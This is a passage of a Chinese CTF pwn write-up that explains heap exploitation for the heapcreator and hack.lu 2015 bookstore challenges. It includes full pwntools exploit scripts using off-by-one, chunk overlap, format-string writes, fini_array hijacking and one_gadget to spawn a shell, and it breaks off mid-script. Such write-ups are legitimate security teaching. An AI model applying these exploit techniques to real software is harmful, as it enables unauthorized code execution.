chunk1 free ( 1 ) pwndbg> bin fastbins 0x20: 0xac4060 \u25c2\u2014 0x0 //chunk1 content 0x30: 0x0 0x40: 0xac4040 \u25c2\u2014 0x0 //chunk1 struct 0x50: 0x0 0x60: 0x0 0x70: 0x0 0x80: 0x0 \u5c06\u8fd9\u4e24\u4e2a\u7a7a\u95f2\u5806\u7533\u8bf7\u51fa\u6765\uff0c\u7531\u4e8e malloc \u673a\u5236\uff0c\u7533\u8bf7\u76f8\u540c\u5927\u5c0f\u7684 chunk \u624d\u4f1a\u7528 fastbin \u4e2d\u7a7a\u95f2\u5185\u5b58\u30020x20 \u4f1a\u7528\u4f5c\u65b0 chunk \u7684\u7ed3\u6784\u4f53\uff0c0x40 \u4f1a\u7528\u4f5c\u65b0 chunk \u7684 content \u3002 create ( 0x30 , 'a' * 0x18 + p64 ( 0x21 ) + p64 ( 0x30 ) + p64 ( free_got )) \u8fd9\u91cc\u4e3a\u4e86\u65b9\u4fbf\u7528 chunk1' \u8868\u793a\u65b0\u7533\u8bf7\u7684\u5806\uff0c\u5b9e\u9645\u4e0a\u8fd9\u4e2a\u5806\u5e8f\u53f7\u8fd8\u662f 1 \uff0c\u5806\u7ed3\u6784\u5982\u4e0b\uff1a pwndbg> x /20gx 0xac4000 0xac4000: 0x0000000000000000 0x0000000000000021 0xac4010: 0x0000000000000018 0x0000000000ac4030 0xac4020: 0x0000000000000000 0x0000000000000021 0xac4030: 0x0068732f6e69622f 0x6161616161616161 0xac4040: 0x6161616161616161 0x0000000000000041 //chunk1' content 0xac4050: 0x6161616161616161 0x6161616161616161 0xac4060: 0x6161616161616161 0x0000000000000021 //chunk1' struct 0xac4070: 0x0000000000000030 0x0000000000602018 0xac4080: 0x0000000000000000 0x0000000000020f81 0xac4090: 0x0000000000000000 0x0000000000000000 \u7136\u540e\u5c31\u662f\u6cc4\u9732 libc \u5730\u5740\uff0c\u4fee\u6539 GOT \u8868\uff0c\u6700\u540e\u89e6\u53d1 system('/bin/sh') EXP \u00b6 #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : heapcreator.py from pwn import * context . log_level = 'debug' p = process ( \"./heapcreator\" ) elf = ELF ( \"./heapcreator\" ) libc = ELF ( \"/lib/x86_64-linux-gnu/libc.so.6\" ) def create ( size , context ): p . recvuntil ( \"choice :\" ) p . sendline ( \"1\" ) p . recvuntil ( \"Heap : \" ) p . sendline ( str ( size )) p . recvuntil ( \"heap:\" ) p . send ( context ) def edit ( id , context ): p . recvuntil ( \"choice :\" ) p . sendline ( \"2\" ) p . recvuntil ( \"Index :\" ) p . sendline ( str ( id )) p . recvuntil ( \"heap :\" ) p . send ( context ) def show ( id ): p . recvuntil ( \"choice :\" ) p . sendline ( \"3\" ) p . recvuntil ( \"Index :\" ) p . sendline ( str ( id )) def free ( id ): p . recvuntil ( \"choice :\" ) p . sendline ( \"4\" ) p . recvuntil ( \"Index :\" ) p . sendline ( str ( id )) def exit (): p . recvuntil ( \"choice :\" ) p . sendline ( \"5\" ) # off-by-one create ( 0x18 , 'a' * 0x10 ) #0 create ( 0x10 , 'b' * 0x10 ) #1 edit ( 0 , \"/bin/sh \\x00 \" . ljust ( 0x18 , 'a' ) + \" \\x41 \" ) free ( 1 ) # leak libc free_got = elf . got [ 'free' ] create ( 0x30 , 'a' * 0x18 + p64 ( 0x21 ) + p64 ( 0x30 ) + p64 ( free_got )) show ( 1 ) p . recvuntil ( \"Content : \" ) free_addr = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) log . info ( \"free_addr:\" + hex ( free_addr )) libc_base = free_addr - libc . symbols [ 'free' ] log . info ( \"libc_base:\" + hex ( libc_base )) system = libc_base + libc . symbols [ 'system' ] log . info ( \"system:\" + hex ( system )) edit ( 1 , p64 ( system )) #gdb.attach(p) free ( 0 ) p . interactive () \u5c0f\u7ed3 \u00b6 \u5206\u914d\u5927\u5c0f\u5728 fastbin \u8303\u56f4\u5185\u7684\u65b0\u5806\u5757\uff0c\u9700\u8981\u5927\u5c0f\u5339\u914d\u7528 fastbin \u7684\u7a7a\u95f2\u5806\u5757\u3002\u4e3e\u4e2a\u4f8b\u5b50\uff1afastbin \u4e2d\u6709\u4e00\u4e2a 0x20 \u7684\u7a7a\u95f2\u5806\u5757\uff0c\u9700\u8981\u5206\u914d\u4e00\u4e2a 0x40 \u5806\u5757\uff0c\u4f1a\u4ece topchunk \u4e2d\u5206\u5272 0x40 \u51fa\u6765\uff08\u5982\u679c\u53ef\u4ee5\uff09\u3002 2015 hacklu bookstore \u00b6 \u9898\u76ee\u94fe\u63a5 \u57fa\u672c\u4fe1\u606f \u00b6 64 \u4f4d\u52a8\u6001\u94fe\u63a5\u7684\u7a0b\u5e8f\u3002 books: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3a15f5a8e83e55c535d220473fa76c314d26b124, stripped Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) \u57fa\u672c\u529f\u80fd \u00b6 \u7a0b\u5e8f\u662f\u4e00\u4e2a\u4e70\u4e66\u7684\u7cfb\u7edf\uff0c\u6700\u591a\u53ea\u80fd\u8d2d\u4e70\u4e24\u672c\u4e66\u3002\u6bcf\u4e00\u672c\u4e66\u90fd\u7528\u4e00\u4e2a\u72ec\u7acb\u7684\u5806\u53bb\u7ef4\u62a4\uff0c\u8fd9\u4e2a\u5806\u662f\u7a0b\u5e8f\u81ea\u884c\u7533\u8bf7\u7684\uff0c\u4e0d\u80fd\u4eba\u5de5\u5e72\u9884\u7684\uff0c\u56fa\u5b9a\u5927\u5c0f\u4e3a 0x80 \u3002 \u53ef\u4ee5\u65b0\u589e\u3001\u5220\u9664\u4e66\u7c4d\uff0c\u6700\u540e\u63d0\u4ea4\u662f\u4f1a\u5c06\u4e24\u672c\u4e66\uff08\u4e24\u4e2a\u5806\uff09\u4fe1\u606f\u5408\u5e76\u5230\u4e00\u4e2a\u65b0\u7684\u5806\u4e2d\uff0c\u7136\u540e\u8fdb\u884c\u8f93\u51fa\u3002 \u6f0f\u6d1e\u51fd\u6570 \u00b6 \u5806\u6ea2\u51fa \u00b6 \u5f55\u5165\u4e66\u7c4d\u4fe1\u606f\u7528\u4e00\u4e2a\u81ea\u5b9a\u4e49\u8f93\u5165\u51fd\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u5b58\u5728\u4e00\u4e2a\u5806\u6ea2\u51fa\u7684\u95ee\u9898\u3002\u7ed3\u675f\u8f93\u5165\u7684\u5224\u65ad\u6807\u51c6\u662f\u9047\u5230 \\n \uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\u81ea\u5b9a\u4e49\u8f93\u5165\u51fd\u6570\u4f1a\u5728\u8f93\u5165\u5b57\u7b26\u4e32\u6700\u540e\u52a0\u4e0a\u4e00\u4e2a \\x00 \uff1a UAF \u00b6 \u7a0b\u5e8f\u7684\u5220\u9664\u51fd\u6570\u53ea\u662f\u5c06\u5806\u91ca\u653e\uff0c\u5e76\u6ca1\u6709\u5c06\u6307\u9488\u7f6e\u96f6\uff1a \u683c\u5f0f\u5316\u5b57\u7b26\u4e32 \u00b6 \u7a0b\u5e8f\u9000\u51fa\u6253\u5370\u4fe1\u606f\u65f6\uff0c\u4f1a\u51fa\u73b0\u4e00\u4e2a\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff1a \u5947\u602a\u7684\u8f93\u5165\u957f\u5ea6 \u00b6 \u83dc\u5355\u9009\u62e9\u8f93\u5165\u957f\u5ea6\u4e0a\u9650\u4e3a 0x80 \uff0c\u8fd9\u91cc\u4e0d\u7b97\u662f\u4e00\u4e2a\u6f0f\u6d1e\uff0c\u4f46\u662f\u4f1a\u5728\u540e\u9762\u5229\u7528\u5f53\u4e2d\u8fd0\u7528\u5230\u3002 \u601d\u8def \u00b6 \u8fd9\u6761\u9898\u76ee\u5229\u7528\u8d77\u6765\u6bd4\u8f83\u590d\u6742\uff0c\u6d89\u53ca\u5230\u5806\u6ea2\u51fa\u3001\u5806\u91cd\u53e0\u3001\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u3001\u52ab\u6301 fini_array \u3002\u4e0b\u9762\u5148\u5199\u51fa\u5927\u81f4\u6b65\u9aa4 free book2 \u5229\u7528\u5806\u6ea2\u51fa\u4fee\u6539\u5728 bin \u4e2d\u7684 book2 size \u4e3a 0x151 \uff0c\u8ba9 summit \u7533\u8bf7\u7684 chunk \u653e\u5728\u8fd9\u91cc\uff1b\u5199\u5165\u7cbe\u5fc3\u5e03\u7f6e\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u548c padding \uff0c\u52ab\u6301 fini_array \u3001\u6cc4\u9732\u5730\u5740 \u7b2c\u4e8c\u8f6e\u8fd0\u884c\u7a0b\u5e8f\uff1a free book2 \u5229\u7528\u5806\u6ea2\u51fa\u4fee\u6539\u5728 bin \u4e2d\u7684 book2 size \u4e3a 0x151 \uff0c\u8ba9 summit \u7533\u8bf7\u7684 chunk \u653e\u5728\u8fd9\u91cc\uff1b\u5199\u5165\u7cbe\u5fc3\u5e03\u7f6e\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u548c padding \uff0c\u4fee\u6539\u8fd4\u56de\u5730\u5740\u4e3a one_gadget \u4ea7\u751f\u8fd9\u79cd\u89e3\u9898\u601d\u8def\u601d\u8003\u65b9\u5411\uff1a\u5148\u7740\u773c\u7b80\u5355\u3001\u5df2\u7ecf\u5b66\u8fc7\u719f\u6089\u7684\u6f0f\u6d1e\uff0c\u4e5f\u5c31\u662f\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u8fd9\u4e2a\u6f0f\u6d1e\u3002\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u8bdd\uff0c\u5c31\u662f\u4fee\u6539 got \u8868\u6216\u8005\u8fd4\u56de\u5730\u5740\u7b49\u63a7\u5236\u7a0b\u5e8f\u6d41\u7a0b getshell \u3002 \u8fd9\u91cc \u683c\u5f0f\u5316\u5b57\u7b26\u4e32 \u51fa\u73b0\u5728\u6700\u540e\u4e00\u4e2a printf \uff0c\u4e5f\u5c31\u662f\u8f93\u51fa\u5b8c\u6210\u4e4b\u540e\u7a0b\u5e8f\u5c31\u4f1a\u9000\u51fa\u3002 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5185\u5bb9\u662f\u4ece submit \u7533\u8bf7\u7684 dest \u4e2d\u8bfb\u53d6\u7684\u3002 \u7528\u6237\u65e0\u6cd5\u81ea\u884c\u5206\u914d\u5806\uff0c\u53ea\u80fd\u4ece\u7a0b\u5e8f\u672c\u8eab\u7533\u8bf7\u7684 3 \u5757\u5806\u548c submit \u529f\u80fd\u8bbe\u6cd5\u5229\u7528\u3002 \u63a7\u5236\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5185\u5bb9 \u00b6 \u5148\u6765\u89e3\u51b3\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5185\u5bb9\u7684\u95ee\u9898\u3002\u5185\u5bb9\u662f\u4ece dest \u4e2d\u8bfb\u53d6\u7684\uff0c\u5c31\u8981\u8bbe\u6cd5\u63a7\u5236 dest \u5185\u5bb9\u3002\u8fd9\u91cc\u5229\u7528\u7684\u662f overlapping \u5806\u91cd\u53e0\uff0c\u5c06 chunk2 \u548c chunk3 \u91cd\u53e0\u8d77\u6765\uff0c\u5229\u7528 submit \u590d\u5236\u529f\u80fd\u6ea2\u51fa\u63a7\u5236 dest \u4e2d\u7684\u5185\u5bb9\u3002 \u9020\u6210 overlapping \u5148 free chunk2 \uff0c\u518d\u901a\u8fc7\u5199\u5165 book1 \u529f\u80fd\u6ea2\u51fa\u4fee\u6539 chunk2 \u7684 size \u5b57\u6bb5\u4e3a 0x151 \u3002\u8fd9\u6837\u5f53 submit \u529f\u80fd\u7533\u8bf7 0x140 \u5806\u5757\uff08\u4e0d\u542bchunk header\uff09\u7684\u65f6\u5019\u5c31\u4f1a\u53bb\u5230 unsortedbin \u4e2d\u627e\u5230\u88ab\u6211\u4eec\u4fee\u6539\u5927\u5c0f\u4e3a 0x151 \u7684 chunk2 \u3002 submit \u529f\u80fd\u6b63\u5e38\u60c5\u51b5\u4e0b\u590d\u5236\u7684\u5185\u5bb9\u662f\u8fd9\u6837\u7684\uff1a \"Order 1: \" + book1 + \"\\nOrder 2: \" + book2 + '\\n' \u4f46\u662f\u6211\u4eec\u5c06 chunk2 chunk3 \u91cd\u53e0\u5728\u4e00\u8d77\uff0c\u4e14 chunk header \u662f\u540c\u4e00\u5730\u5740\u3002\u7b80\u5355\u70b9\u5c31\u662f\u4e24\u4e2a\u5806\u5f00\u59cb\u5730\u5740\u76f8\u540c\uff0c\u7ed3\u675f\u5730\u5740\u4e0d\u540c\u3002 chunk1 chunk2 \u5730\u5740\u6307\u9488\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u6ca1\u6709\u88ab\u4e8c\u6b21\u8d4b\u503c\uff0c\u4e00\u76f4\u4fdd\u5b58\u7740\u7533\u8bf7\u5806\u65f6\u7684\u5730\u5740\u3002\uff08free chunk2 \u65f6\u56e0\u4e3a\u6709 UAF \u6f0f\u6d1e\uff0c\u6240\u4ee5\u6ca1\u88ab\u91cd\u7f6e\u3002\uff09\u9020\u6210\u7684\u5f71\u54cd\u5c31\u662f chunk2 \u7684\u5185\u5bb9 submit \u7684\u65f6\u5019\u88ab\u5199\u4e3a \"Order 1: \" + book1 \uff0c\u8be6\u7ec6\u8fc7\u7a0b\u5982\u4e0b\uff1a submit \u5904\u7406 chunk1 \u4fe1\u606f\uff0c\u5411 chunk3\uff08\u5373chunk2\uff09\u5199\u5165\uff1a \"Order 1: \" + book1 submit \u5904\u7406 chunk2 \u4fe1\u606f\uff0c\u5411 chunk3\uff08\u5373chunk2\uff09\u5199\u5165\uff1a \"\\nOrder 2: \" + \"Order 1: \" + book1 + '\\n' \u5148\u770b\u770b chunk1\u3001chunk2\uff08chunk3\uff09\u3001dest \u4e09\u4e2a\u5806\u7684\u5206\u5e03\u60c5\u51b5\uff1a \u6211\u4eec\u63a7\u5236 chunk1 \u5185\u5bb9\uff0c\u5199\u5165\u6709\u6548 payload \u548c padding \uff0c\u5c06\u6709\u6548 payload \u6ea2\u51fa\u5199\u5165\u5230 dest \uff08fd \u6307\u9488\u5904\u5f00\u59cb\uff09\u3002\u6362\u53e5\u8bdd\u5c31\u662f\u6211\u4eec\u5e0c\u671b\u56fe\u4e0a 0xef3010 \u5f00\u59cb\u5199\u5165\u7684\u5185\u5bb9\uff0c\u590d\u5236\u5230 0xef3130 \u3002\u53ef\u4ee5\u5f97\u51fa\u8ba1\u7b97\u516c\u5f0f\uff1a\uff08\"\" \u4e0d\u7b97\u4e2a\u6570\uff09 # \u9700\u8981\u5728\u590d\u5236\u7b2c\u4e8c\u4e2achunk1\u524d\uff0c\u586b\u5145\u597d0x90\u5b57\u8282\uff0c\u4e5f\u5c31\u662fchunk2(3) fd\u5f00\u59cb\u5230dest fd\u5f00\u59cb\u7684\u8ddd\u79bb\uff0c\u8fd9\u6837chunk1\u5c31\u4f1a\u88ab\u590d\u5236\u5230dest fd\u5f00\u59cb \"Order 1:\" + chunk1 + \"\\n\" + \"Order 2:\" + \"Order 1:\" == 0x90 # \u5316\u7b80\u4e3a chunk1 == 0x90 - 28 == 0x74 \u5f97\u51fa\u7ed3\u8bba\uff1a\u5c06\u6709\u6548 payload \u5199\u5728 chunk1 \u5f00\u5934\uff0c\u7136\u540e\u5c06 chunk1 \u7528\u975e \\x00 \u586b\u5145\u957f\u5ea6\u4e3a 0x74 \uff0c\u5f53submit \u7684\u65f6\u5019\uff0c\u6709\u6548 payload \u5c31\u4f1a\u653e\u5728 dest \u7684 fd \u3002\u8fd9\u6837\u5c31\u83b7\u5f97\u4e00\u4e2a\u4efb\u610f\u8bfb\u5199\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\uff0c\u9700\u8981\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6cc4\u9732\u3001\u4fee\u6539\u63d0\u524d\u5728\u4fee\u6539 chunk1 \u65f6\u5199\u5165\u5373\u53ef\u3002 \u76ee\u524d\u5f97\u51fa payload \uff1a payload1 = 'b' * 8 #\u683c\u5f0f\u5316\u5b57\u7b26\u4e32 payload1 = payload1 . ljust ( 0x74 , 'a' ) . ljust ( 0x88 , ' \\x00 ' ) payload1 += p64 ( 0x151 ) edit ( 1 , payload1 ) \u52ab\u6301 fini_array \u00b6 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5185\u5bb9\u5df2\u7ecf\u8bbe\u6cd5\u63a7\u5236\u4e86\uff0c\u4f46\u662f getshell \u9700\u8981\u4e24\u6b21\u4f7f\u7528\u8fd9\u4e2a\u6f0f\u6d1e\uff0c\u4e00\u6b21\u6cc4\u9732\u5730\u5740\uff0c\u4e00\u6b21\u4fee\u6539\u5730\u5740\u3002 \u8fd9\u91cc\u5c31\u9700\u8981\u7528\u5230\u4e00\u4e2a\u77e5\u8bc6\uff0cmain \u51fd\u6570\u662f\u4e8c\u5f1f\uff0c\u4ed6\u6709\u5927\u54e5\uff0c\u6709\u4e09\u5f1f\u3002\u7a0b\u5e8f\u5f00\u59cb\u5148\u8fd0\u884c\u4e00\u6b21\u5927\u54e5\uff0c\u5728\u8fd0\u884c main \uff0c\u6700\u540e\u8fd0\u884c\u4e09\u5f1f\u3002\u4e09\u5f1f\u5f53\u505a\u6709\u4e2a\u6570\u7ec4\uff1a .fini_array \u3002\u7a0b\u5e8f\u9000\u51fa\u540e\u4f1a\u6267\u884c .fini_array \u5730\u5740\u51fa\u7684\u51fd\u6570\uff0c\u4e0d\u8fc7\u53ea\u80fd\u5229\u7528\u4e00\u6b21\uff08\u52a8\u6001\u94fe\u63a5\u7a0b\u5e8f\uff09\u3002 \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u7b2c\u4e00\u8f6e\u6cc4\u9732\u5730\u5740\u7684\u540c\u65f6\uff0c\u4fee\u6539 .fini_array \u7684\u5730\u5740\u4e3a main \u51fd\u6570\u5730\u5740\uff0c\u8ba9\u7a0b\u5e8f\u91cd\u65b0\u8fd0\u884c\u4e00\u6b21\u3002main \u51fd\u6570\u5730\u5740\u6613\u77e5\uff0c\u5173\u952e\u662f .fini_array \u5730\u5740\u600e\u4e48\u627e\u3002 \u52a8\u6001\u94fe\u63a5\u4e0e\u9759\u6001\u94fe\u63a5\u67e5\u627e\u548c\u5229\u7528\u6709\u5dee\u522b\uff0c\u4e3a\u4e86\u7bc7\u5e45\u5c06\u4e24\u8005\u533a\u522b\u653e\u5728\u6700\u540e\u3002\u5bf9 64 \u4f4d\u9759\u6001\u7a0b\u5e8f\u52ab\u6301 fini_array \u6709\u5174\u8da3\u53ef\u4ee5\u770b\u770b\uff1a \u52ab\u6301 64 \u4f4d fini_array \u8fdb\u884c ROP \u653b\u51fb Way 1 \u00b6 IDA \u4e2d Ctrl+S \u67e5\u627e .fini_array \u5730\u5740\uff0c\u53ef\u4ee5\u770b\u5230\u8fd9\u4e2a\u6570\u7ec4\u7a7a\u95f4\u5927\u5c0f\u4e3a 8 \u5b57\u8282\uff0c\u53ea\u80fd\u653e\u4e00\u4e2a\u5730\u5740\uff0c\u8fd9\u662f\u4e0e\u9759\u6001\u7a0b\u5e8f\u7684\u4e00\u4e2a\u533a\u522b\uff08\u9759\u6001\u6709\u4e24\u4e2a\u5730\u5740\uff09\u3002 Way 2 \u00b6 \u7528 gdb \u8c03\u8bd5\u7a0b\u5e8f\uff0c\u8f93\u5165 elf \u67e5\u627e .fini_array \u8981\u7d20\u5177\u5907\u4f46\u662f\u9047\u5230\u4e00\u4e2a\u95ee\u9898\uff0c\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u5185\u5bb9\u662f\u5b58\u653e\u5728\u5806\u4e0a\uff0c\u6808\u4e0a\u9762\u53ea\u6709\u8be5\u5806\u7684\u6307\u9488\u800c\u5df2\u3002\u7c7b\u4f3c\u9898\u76ee\uff1actf-wiki \u7684 \u5806\u4e0a\u7684\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e \u3002 \u8fd9\u9053\u9898\u76ee\u6211\u4eec\u4e0d\u641e\u6808\u8fc1\u79fb\u5230\u5806\u4e0a\u9762\uff0c\u800c\u662f\u5229\u7528\u83dc\u5355\u7684\u5947\u602a\u8f93\u5165\u957f\u5ea6\uff0c\u5c06\u5730\u5740\u5199\u5165\u5230\u6808\u4e0a\u3002 # \u4e3a\u4e86\u5bf9\u9f50\u524d\u9762\u586b\u51458\u5b57\u8282\u7528\u6765\u653e\u83dc\u5355\u9009\u9879\uff0cfini_array\u504f\u79fb\u4e3a13 # \u6cc4\u9732libc\u53ef\u4ee5\u7528__libc_start_main\u4e5f\u53ef\u4ee5\u548c\u6211\u4e00\u6837\u81ea\u5df1\u5f80\u6808\u4e0a\u5199\u4e00\u4e2a payload2 = '5' * 8 + p64 ( fini_array ) + p64 ( free_got ) p . recvuntil ( \"5: Submit \\n \" ) p . sendline ( payload2 ) \u6cc4\u9732 libc \u5730\u5740\u548c\u52ab\u6301 fini_array payload \u76ee\u524d\u6784\u9020\uff1a payload1 = \" %2617c %13$hn\" + '|' + \"%14$s\" payload1 = payload1 . ljust ( 0x74 , 'a' ) . ljust ( 0x88 , ' \\x00 ' ) payload1 += p64 ( 0x151 ) edit ( 1 , payload1 ) \u4fee\u6539 main \u51fd\u6570\u8fd4\u56de\u5730\u5740 \u00b6 \u5230\u8fd9\u91cc\u6211\u4eec\u5c31\u83b7\u53d6\u4e86 libc_base \u5730\u5740\u5e76\u4e14\u8fdb\u5165\u4e86\u7b2c\u4e8c\u6b21\u7684 main \u51fd\u6570\u3002\u4e0b\u4e00\u6b65\u5c31\u662f\u5982\u4f55\u5229\u7528\u4e86\u3002 \u5c31 free got \u8868\u6539\u4e3a onegadget \uff1f\u5728\u8fd9\u91cc\u4e0d\u884c\uff0c\u56e0\u4e3a\u4fee\u6539\u73a9\u4e4b\u540e\u9700\u8981\u89e6\u53d1\uff0c\u4e5f\u5c31\u662f\u518d\u4e00\u6b21\u8fdb\u5165 main \u51fd\u6570\u89e6\u53d1 free \u51fd\u6570\u3002\u7b2c\u4e8c\u6b21\u8fdb\u5165 main \u51fd\u6570\u5b9e\u9645\u4e0a\u662f\u5728 __libc_csu_fini \u8fd9\u4e2a\u9000\u51fa\u51fd\u6570\u4e2d\u8c03\u7528 fini_array \u6570\u7ec4\u4e2d\u5b58\u50a8\u7684\u51fd\u6570\uff08main\uff09\uff0c\u5f53\u6267\u884c\u5b8c main \uff0c\u5c31\u4f1a\u7ee7\u7eed\u5b8c\u6210\u9000\u51fa\u51fd\u6570\uff0c\u7136\u540e\u6b63\u5e38\u9000\u51fa\u7a0b\u5e8f\u3002 \u8fd9\u91cc\u6709\u4e24\u4e2a\u601d\u8def\uff1a \u540c\u7b2c\u4e00\u6b21 mian \u4e2d\uff0c\u6cc4\u9732\u51fa\u6808\u5730\u5740\uff0c\u901a\u8fc7\u8c03\u8bd5\u83b7\u53d6\u5230\u7b2c\u4e8c\u6b21 main \u7684\u8fd4\u56de\u5730\u5740\u4e0e\u6cc4\u9732\u6808\u5730\u5740\u7684\u504f\u79fb\uff0c\u5c31\u53ef\u4ee5\u83b7\u53d6\u5230 main rip \u7684\u6808\u5730\u5740\uff0c\u6211\u4eec\u5bf9\u6b64\u8fdb\u884c\u4fee\u6539\u3002 \u4fee\u6539\u9000\u51fa\u51fd\u6570\u5f53\u4e2d\u67d0\u4e2a\u51fd\u6570\u7684 got \u8868\uff0c\u5f53\u5b8c\u6210\u9000\u51fa\u51fd\u6570\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570\u5c31\u4f1a getshell\u3002 \u7b2c\u4e8c\u79cd\u601d\u8def\u662f\u6709\u51e0\u6b21\u6bd4\u8d5b\u51fa\u73b0\u8fc7\u8fd9\u79cd\u5229\u7528\u65b9\u6cd5\uff0c\u4f46\u6ca1\u6709\u5728\u8fd9\u9053\u9898\u76ee\u4e0a\u5c1d\u8bd5\uff0c\u4e3b\u8981\u662f\u592a\u8d39\u52b2\u4e86\u3002\u8fd9\u9053\u9898\u5c31\u7528\u7b2c\u4e00\u79cd\u65b9\u6cd5\uff0c\u5c31\u662f\u9700\u8981\u6211\u4eec\u6cc4\u9732\u51fa \u6808\u5730\u5740 \uff0c\u7136\u540e\u56e0\u4e3a\u6808\u7ed3\u6784\u56fa\u5b9a\uff0c\u6240\u4ee5\u901a\u8fc7\u504f\u79fb\u7b97\u51fa\u7b2c\u4e8c main \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u3002 \u901a\u8fc7\u8c03\u8bd5\u67e5\u770b\u7b2c\u4e00\u4e2a main \u51fd\u6570\u7684\u6808\u7a7a\u95f4\u7ed3\u6784\u4f53\uff1a \u5728\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u7684\u65f6\u5019\u628a\u8fd9\u4e2a\u5730\u5740\u4e5f\u6cc4\u9732\u51fa\u6765\uff1a payload1 = \" %2617c %13$hn\" + '|' + \"%14$s\" + '-' + \"%24$p\" payload1 = payload1 . ljust ( 0x74 , 'a' ) . ljust ( 0x88 , ' \\x00 ' ) payload1 += p64 ( 0x151 ) edit ( 1 , payload1 ) \u518d\u6b21\u901a\u8fc7\u8c03\u8bd5\u627e\u5230\u7b2c\u4e8c\u6b21 main \u51fd\u6570\u8fd4\u56de\u5730\u5740\uff0c\u7136\u540e\u8ba1\u7b97\u56fa\u5b9a\u504f\u79fb\uff1a 0x7ffea45d8980 - 0x7ffea45d887a = 0x106 \u6240\u4ee5\u5f97\u51fa\u8ba1\u7b97\u516c\u5f0f\uff1a # ret_addr \u4e3a\u6cc4\u9732\u5730\u5740 attack_addr = ret_addr - 0x106 \u7b2c\u4e8c\u6b21\u8fdb\u5165 main \u51fd\u6570\u7684\u5229\u7528\u601d\u8def\u5c31\u51fa\u6765\u4e86\uff0c\u548c\u7b2c\u4e00\u6b21\u8fdb\u5165\u4e00\u6837\uff0c\u5148\u91ca\u653e chunk2 \u9020\u6210 overlapping \u5806\u91cd\u53e0\uff0c\u63a7\u5236 dest \u5185\u5bb9\u4ece\u800c\u63a7\u5236\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u5185\u5bb9\u3002\u5229\u7528\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u4fee\u6539\u7b2c\u4e8c\u6b21 main \u51fd\u6570\u7684\u8fd4\u56de\u5730\u5740\u4e3a onegadget \u3002 exp \u00b6 #!/usr/bin/env python # -*- coding: utf-8 -*- # @Author : MrSkYe # @Email : skye231@foxmail.com # @File : books.py from pwn import * context . log_level = 'debug' p = process ( \"./books\" ) elf = ELF ( \"./books\" ) libc = ELF ( \"/lib/x86_64-linux-gnu/libc.so.6\" ) def command ( cmd ): p . recvuntil ( \"5: Submit \\n \" ) p . sendline ( str ( cmd )) def edit ( cmd , content ): command ( cmd ) p . recvuntil ( \"order: \\n \" ) p . sendline ( content ) def free ( cmd ): command ( cmd + 2 ) free_got = elf . got [ 'free' ] fini_array = 0x6011B8 main_addr = 0x400A39 # ====round1==== # free book2 \u653e\u5165 unsortedbin free ( 2 ) # \u4fee\u6539 fini_array \u4e3a main # \u6cc4\u9732 libc_base # \u6cc4\u9732 stack \u5730\u5740 payload1 = \" %2617c %13$hn\" + '|' + \"%14$s\" + '-' + \"%24$p\" payload1 = payload1 . ljust ( 0x74 , 'a' ) . ljust ( 0x88 , ' \\x00 ' ) payload1 += p64 ( 0x151 ) edit ( 1 , payload1 ) # \u4ece\u83dc\u5355\u9009\u9879\u5c06fini_array\u548cfree_got\u5199\u5165\u5230\u6808\u4e0a payload2 = '5' * 8 + p64 ( fini_array ) + p64 ( free_got ) p . recvuntil ( \"5: Submit \\n \" ) p . sendline ( payload2 ) p . recvuntil ( \"|\" ) p . recvuntil ( \"|\" ) p . recvuntil ( \"|\" ) # \u5904\u7406libc\u5730\u5740 free_addr = u64 ( p . recv ( 6 ) . ljust ( 8 , ' \\x00 ' )) log . info ( \"free_addr:\" + hex ( free_addr )) libc_base = free_addr - libc . symbols [ 'free' ] log . info ( \"libc_base:\" + hex ( libc_base )) onegadget = libc_base + 0x45226 log . info ( \"onegadget:\" + hex ( onegadget )) # \u5904\u7406\u6808\u5730\u5740 p . recvuntil ( \"-\" ) ret_addr = int ( p . recv ( 14 ), 16 ) log . info ( \"ret_addr:\" + hex ( ret_addr )) attack_addr = ret_addr - 0x106 log . info ( \"attack_addr:\" + hex ( attack_addr )) # ====round2==== # \u540c round1 free ( 2 ) # \u5904\u7406\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u586b\u5145\u5b57\u8282\u6570\uff0c\u5904\u7406\u9ad8\u5730\u5740\u503c\u5c0f\u4e8e\u4f4e\u5730\u5740\u60c5\u51b5 one_1 = onegadget & 0xffff log . info ( \"one_1:\" + hex ( one_1 )) one_2 = onegadget >> 16 & 0xffff log . info ( \"one_2:\" + hex ( one_2 )) if one_1 > one_2 : one_2 = one_2 + 0x10000 - one_1 else : one_2 -= one_1 # \u4fee\u6539\u7b2c\u4e8c\u6b21main\u8fd4\u56de\u5730\u5740 payload4 = \"% {} c%13$hn\" . format ( one_1 ) + \"% {} c%14$hn\" . format ( one_2 ) payload4 = payload4 . ljust ( 0x74 , 'c' ) . ljust ( 